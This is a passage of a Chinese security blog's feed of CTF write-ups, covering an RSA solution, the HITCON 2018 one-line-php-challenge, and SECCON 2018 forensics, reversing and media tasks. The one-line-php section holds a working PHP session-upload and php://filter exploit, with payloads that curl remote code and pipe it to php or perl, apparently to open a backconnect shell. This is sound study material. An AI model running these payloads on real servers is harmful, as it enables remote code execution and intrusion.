p1*p2记作n3, lcm。</span></span><br><span class="line"><span class="comment"># 上式可看作 pow(flag**2,7,lcm)==f3，等价于 pow(flag**2,7,n1)==f3%n1,pow(flag**2,7,n2)==f3%n2,pow(flag**2,7,n3)==f3%n3</span></span><br><span class="line"><span class="comment"># 由于 gcd(7,n1)==7,gcd(7,n2)==7。所以尝试选取 pow(flag**2,7,n3)==f3%n3 计算 flag**2 的值</span></span><br><span class="line">n3=p1*p2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(p1<span class="number">-1</span>)*(p2<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(<span class="number">7</span>,phi3)==<span class="number">1</span>)</span><br><span class="line">d3=gmpy2.invert(<span class="number">7</span>,phi3)</span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">    flag=gmpy2.iroot(m3,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    print(binascii.unhexlify(hex(flag)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'EIS&#123;Comm0n_Div15or_plus_CRT_is_so_easy|cb2733b9e69ab3a9bd526fa1&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。&lt;/p&gt;
&lt;p&gt;如果没有理解错误的话，不互质并不会导致加密不安全
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>one-line-php-challenge 复现</title>
    <link href="https://findneo.github.io/181123-one-line-php-challenge/"/>
    <id>https://findneo.github.io/181123-one-line-php-challenge/</id>
    <published>2018-11-23T00:31:07.000Z</published>
    <updated>2019-01-25T23:21:37.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>环境：<code>This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code> 。</p><p><img src="2018-10-23_200848.png" alt="alt"> </p><h1 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h1><ul><li><code>$_GET</code> 是一个数组，包含通过URL参数传给当前脚本的变量。如访问<code>localhost?orange=123&amp;foo=bar</code> ，则 <code>$_GET</code> 为 <code>array (&#39;orange&#39; =&gt; &#39;123&#39;,&#39;foo&#39; =&gt; &#39;bar&#39;,)</code> ，<code>$_GET[&#39;orange&#39;]</code> 为<code>&#39;123&#39;</code> 。另外，<code>$_GET</code> 是超全局变量，即在全部作用域中始终可用的内置变量。</li><li><code>@</code>被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<code>&lt;?php $_=$_GET[&#39;orange&#39;];</code> 的PHP文件，直接访问其会报错 <code>Notice :  Undefined index: orange in...</code> ，加上 <code>@</code> 后就不会显示错误信息。</li><li>赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。<code>The value of an assignment expression is the value assigned</code> 。</li><li><code>$_</code> 。一个普通的变量名。</li><li><code>file()</code> 。把整个文件读入数组中。<ul><li><code>array file ( string $filename [, int $flags = 0 [, resource $context ]] )</code>  </li><li><img src="1542959895935.png" alt="1542959895935"></li><li><img src="1542960054923.png" alt="1542960054923"> </li></ul></li><li><code>string substr ( string $string , int $start [, int $length ] )</code> 。</li><li>include 语句包含并运行指定文件。</li><li><code>(expr1) ? (expr2) : (expr3)</code> 是一个条件运算符，和C语言类似。</li><li>使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是<code>@&lt;?php</code> ，就将它包含并运行。</li><li>相关文档： <a href="http://php.net/manual/en/language.operators.assignment.php" target="_blank" rel="noopener">Assignment Operators</a> , <a href="http://php.net/manual/en/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a> , <a href="http://php.net/manual/en/language.operators.errorcontrol.php" target="_blank" rel="noopener">Error Control Operators</a> ,  <a href="http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary" target="_blank" rel="noopener">三元运算符</a> </li></ul><h1 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h1><h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p><code>allow_url_include</code> 默认值是<code>off</code> ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。</p><p>最主要的利用点在于：如果在上传文件的同时POST <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。</p><p>做个实验。</p><p>我的环境：<code>PHP7.2 + Apache on Kali 4.18</code> </p><p><img src="1542968416018.png" alt="1542968416018"></p><p>会发现确实如此。而且不仅如此。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking'</span> -F <span class="string">'file=@/etc/passwd'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange2'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2'</span> -F <span class="string">'foobar=anystring'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange3'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3'</span>  1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange4'</span> -d <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4'</span>  1&gt;/dev/null</span><br></pre></td></tr></table></figure><p>我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。</p><p><img src="1542969726963.png" alt="第一次"></p><p><img src="1542969783918.png" alt="第二次"></p><p><img src="1542969815646.png" alt="第三次"></p><p><img src="1542969856431.png" alt="第四次"></p><p>但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 <code>session.upload_progress.cleanup=on</code> ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loop.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> threadpool</span><br><span class="line"></span><br><span class="line">sessname=<span class="string">"iamnotorange"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner</span><span class="params">(i)</span>:</span></span><br><span class="line">cmd=<span class="string">"curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1&gt;/dev/null"</span>%sessname</span><br><span class="line">os.system(cmd)</span><br><span class="line">os.system(<span class="string">"xxd /var/lib/php/sessions/sess_%s "</span>%sessname)</span><br><span class="line">pool=threadpool(<span class="number">30</span>)</span><br><span class="line">result=pool.map_async(runner,range(<span class="number">30</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><img src="1542964721887.png" alt="1542964721887"></p><p>可以观察到，文件内容的前一部分是可控的。</p><h3 id="超大文件"><a href="#超大文件" class="headerlink" title="超大文件"></a>超大文件</h3><h2 id="变换文件内容"><a href="#变换文件内容" class="headerlink" title="变换文件内容"></a>变换文件内容</h2><p>到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以<code>upload_progress_</code> 开头，而我们期望他是以 <code>@&lt;?php</code> 开头。于是需要变换文件内容，可以利用 <code>php://filter</code> ，比如将文件内容多次base64解码得到我们想要的字符串。</p><p>base64解码的特点在于：</p><ul><li>可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。</li><li>base64编码后的字符串只会包含 <code>[0-9a-z-A-Z+\=]</code> ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。</li></ul><p>所以实际上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import base64;print base64.b64decode('\x11\x22\x23\x24'*24+base64.b64encode('test'))"</span></span><br></pre></td></tr></table></figure><p>的执行结果还是test。</p><p>我们只要想办法让<code>upload_progress_</code> 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 <code>upload_progress_</code> 有16个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结合利用"><a href="#结合利用" class="headerlink" title="结合利用"></a>结合利用</h1><p>将诸如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php `curl remote.ip | php - ;?&gt;`</span><br></pre></td></tr></table></figure><p>的payload三次编码再加上填充数据后作为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的值上传，然后利用</p><p><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever</code> 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://54.250.246.238/'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload = xxx</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    filename = <span class="string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> % filename</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'%s?orange=%s'</span> % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">'orange'</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><a href="http://www.wupco.cn/?p=4460" target="_blank" rel="noopener">http://www.wupco.cn/?p=4460</a> </li><li><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a> </li><li><a href="https://bugs.php.net/bug.php?id=72681" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72681</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;p&gt;环境：&lt;code&gt;This is a default installation PHP7.2 + Apache on Ubuntu 18.0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SECCON 2018</title>
    <link href="https://findneo.github.io/181028-seccon-wp/"/>
    <id>https://findneo.github.io/181028-seccon-wp/</id>
    <published>2018-10-28T08:05:30.000Z</published>
    <updated>2019-01-25T23:21:37.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>压缩命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'SECCON&#123;'</span>`cat key`<span class="string">'&#125;'</span> &gt; flag.txt</span><br><span class="line">zip -e --password=`perl -e <span class="string">"print time()"</span>` flag.zip flag.txt</span><br></pre></td></tr></table></figure><p>update:</p><p>###</p><p>比较棒的思路是flag.zip生成时刻的时间戳就是他的密码。那么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stat</span> -c %Y flag.zip</span><br><span class="line">1540566641</span><br></pre></td></tr></table></figure><p>###</p><p>爆破密码：</p><p><img src="1540714389474.png" alt="1540714389474"></p><p><img src="1540714399554.png" alt="1540714399554"></p><p><img src="1540714953343.png" alt="1540714953343"></p><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk J</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">3912330       0x3BB28A        ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file <span class="built_in">type</span>: binary, original name: <span class="string">"1"</span>, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS</span><br><span class="line"><span class="comment"># MS-DOS 以小端序存储数据</span></span><br><span class="line"></span><br><span class="line">$ strings -el J | grep SEC</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep CON</span><br><span class="line">...foo...</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC.txt</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;tktksec.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;ensic.txt</span><br><span class="line">&lt;s.txt</span><br><span class="line">&lt;_usnjrnl.txt</span><br><span class="line">&lt;2018&#125;.txt</span><br><span class="line">&lt;logfile.txt.0</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq | tail -n 10 | sed -E <span class="string">'s/&lt;(.*).txt.*/\1/g'</span> | tr  -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;F0rtktksecF0rensics_usnjrnl2018&#125;</span><br></pre></td></tr></table></figure><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Runme"><a href="#Runme" class="headerlink" title="Runme"></a>Runme</h2><p>misc式的水题。就是不断跟进函数，每个函数传入一个参数，拼凑起来就可以了。会得到 <code>&quot;C:\Temp\SECCON2018Online.exe&quot; SECCON{Runn1n6_P47h}</code> 。</p><p>update:</p><p>###</p><p>比较骚的做法是直接strings</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ strings runme</span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">...foo...</span><br><span class="line">BRjS</span><br><span class="line">BRjE</span><br><span class="line">BRjC</span><br><span class="line">BRjC</span><br><span class="line">BRjO</span><br><span class="line">BRjN</span><br><span class="line">BRj&#123;</span><br><span class="line">BRjR</span><br><span class="line">BRju</span><br><span class="line">...bar...</span><br><span class="line">$ strings runme | sed -E <span class="string">'s/BRj(.)/\1/g'</span> | tr -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;Runn1n6_P47h&#125;</span><br></pre></td></tr></table></figure><p>###</p><h1 id="Media"><a href="#Media" class="headerlink" title="Media"></a>Media</h1><h2 id="Needle-in-a-haystack"><a href="#Needle-in-a-haystack" class="headerlink" title="Needle in a haystack"></a>Needle in a haystack</h2><p>提供一个YouTube的视频链接（<a href="https://www.youtube.com/watch?v=sTKP2btHSBQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=sTKP2btHSBQ</a> ），长达九个多小时。</p><p>从 <a href="https://y2mate.com/youtube/sTKP2btHSBQ" target="_blank" rel="noopener">https://y2mate.com/youtube/sTKP2btHSBQ</a> 下载360p的，差不多1.9G。快进查看会发现右下角有一个房间的灯亮灭很有规律，基本每分钟都会有变化。</p><p><img src="1540715588584.png" alt="1540715588584"></p><p>我们把亮记为1，暗记为0的话，整个视频时长545分钟，可以得到约545比特的信息。大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>其中有四种数据，<code>0</code>，<code>1</code> ，<code>000</code> ，<code>111</code> ，分别对应亮、暗、长亮、长暗四种状态，对应到摩斯电码则是<code>.</code> ，<code>短间隔</code>，<code>-</code> ，<code>长间隔</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        <span class="keyword">if</span> s[i:i+<span class="number">3</span>] == <span class="string">'000'</span>:</span><br><span class="line">            res+=<span class="string">' '</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i:i+<span class="number">3</span>] == <span class="string">'111'</span>:</span><br><span class="line">            res+=<span class="string">'-'</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'1'</span>:</span><br><span class="line">            res+=<span class="string">'.'</span></span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'0'</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">raw=<span class="string">'01010100010001110101110100011101011101000111011101110001110100011101011101110100010101000111011101110001110111000100011100010100011101110001000101010001110101010101110001011100011101010101011100010101000100011101011101000101110100010001110001110101010101110001110111000100010101000101010001011100011101110100010001110101010101110001110101010001011101000111011101110001011100011101010001110101110100010111000101010001110??01010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">may=<span class="string">'010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100001010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">print(do(may))</span><br><span class="line"><span class="comment"># ... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ..- ..... - ...- . . -. ..- ..-. ..- .. . - .. . .. -.</span></span><br><span class="line"><span class="comment"># http://rumkin.com/tools/cipher/morse.php</span></span><br><span class="line"><span class="comment"># SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTU5TVEENUFUIETIEIN</span></span><br></pre></td></tr></table></figure><p>天亮后看得很不清晰了，而且貌似 6h58min 之后窗户都会间歇性地被关上，所以flag的后半段有点问题。</p><p><img src="1540716372243.png" alt="1540716372243"></p><p>update:</p><p>###</p><p>实际上天亮以后用窗户的开关来表示，窗户打开为1，窗户关闭为0（正好和原来的处理方式01相反，所以得不到flag），思维太僵硬啊😂</p><p>那么就得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="linespan><br><span class="line">... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ... -....- -... --- .-.. -.. .-.. -.-- -.--.-</span><br><span class="line">SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTS-BOLDLY)</span><br></pre></td></tr></table></figure><p>这个图片解释得很到位了，不过我觉得徒手开关两个多小时的窗户太不黑客了吧，他们一定用了某种方式自动化。</p><p><img src="1540778376203.png" alt="1540778376203"></p><p>###</p><p>update2:</p><p>###</p><p>有大佬做了自动化，效果蛮好的。</p><p>（<a href="https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/" target="_blank" rel="noopener">https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/</a> ）</p><p>###</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class=&quot;headerlink&quot; title=&quot;Forensics&quot;&gt;&lt;/a&gt;Forensics&lt;/h1&gt;&lt;h2 id=&quot;Unzip&quot;&gt;&lt;a href=&quot;#Unzip&quot; class=&quot;header
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hack.lu CTF 2018 Baby PHP</title>
    <link href="https://findneo.github.io/181022-hackluctf-web/"/>
    <id>https://findneo.github.io/181022-hackluctf-web/</id>
    <published>2018-10-22T13:44:52.000Z</published>
    <updated>2019-01-25T23:21:37.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby PHP"></a>Baby PHP</h1><p>环境：<a href="https://arcade.fluxfingers.net:1819/" target="_blank" rel="noopener">https://arcade.fluxfingers.net:1819/</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 